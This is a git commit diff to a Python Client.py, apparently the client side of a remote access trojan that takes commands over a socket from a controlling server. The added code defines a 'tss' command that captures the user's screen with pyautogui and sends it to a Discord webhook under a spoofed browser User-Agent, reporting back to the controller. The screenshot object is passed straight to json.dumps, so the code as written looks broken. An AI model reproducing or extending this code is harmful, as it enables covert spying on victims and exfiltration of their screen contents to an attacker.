8d46a306976be68153bc0f7d0d4bdffdcd25787d
Shamir Khan <xShamir37@gmail.com>
2023-01-29 15:37:05 +0300

    Update Client.py

--- Client.py
+++ Client.py
@@ -175,6 +175,26 @@ while True:
             end = end.encode()
             s.send(end)
             
+        if incoming_message[0] == "tss":
+            screenshot = pyautogui.screenshot()
+            
+            headers = {
+                'Content-Type': 'application/json',
+                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+            }
+            
+            payload = json.dumps({'content': screenshot})
+            
+            try:
+                req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+                urlopen(req)
+                end = str(['tss', "Successfully sent screenshot to discord."])
+            except:
+                end = str(['tss', "Error occured."])
+            
+            end = end.encode()
+            s.send(end)
+            
     except:
         try:
             s.connect((ip, port))
